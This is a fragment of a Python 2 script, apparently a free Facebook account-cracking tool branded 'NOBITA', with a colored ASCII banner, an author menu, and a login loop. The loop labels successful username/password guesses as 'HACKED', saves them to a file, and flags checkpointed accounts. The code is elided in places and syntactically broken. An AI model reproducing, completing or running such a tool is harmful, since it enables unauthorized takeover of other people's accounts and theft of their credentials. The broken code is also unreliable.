...
\033[0;94mNN   NN  OOOOO  BBBBB   IIIII TTTTTTT   AAA      
\033[0;94mNNN  NN OO   OO BB   B   III    TTT    AAAAA     
\033[0;96mNN N NN OO   OO BBBBBB   III    TTT   AA   AA    
\033[0;96mNN  NNN OO   OO BB   BB  III    TTT   AAAAAAA    
\033[0;96mNN   NN  OOOO0  BBBBBB  IIIII   TTT   AA   AA    
                                
""")

print("\033[0;91mThis Tool's Free By 𝐍𝐎𝐁𝐈𝐓𝐀 ")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : 𝐍𝐎𝐁𝐈𝐓𝐀2260🔰
    print '\033[0;94mFACEBOOK : 𝐍𝐎𝐁𝐈𝐓𝐀2260🔰
    print '\033[0;96mGITHUB       : 𝐍𝐎𝐁𝐈𝐓𝐀2260🔰
    print ''\033[0;96m🔰𝐁𝐋𝐎𝐂𝐊 𝐏𝐀𝐍𝐓𝐇𝐄𝐑 𝐂𝐘𝐁𝐄𝐑 𝐅𝐎𝐑𝐂𝐄🔰
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[𝐍𝐎𝐁𝐈𝐓𝐀-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[𝐍𝐎𝐁𝐈𝐓𝐀-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
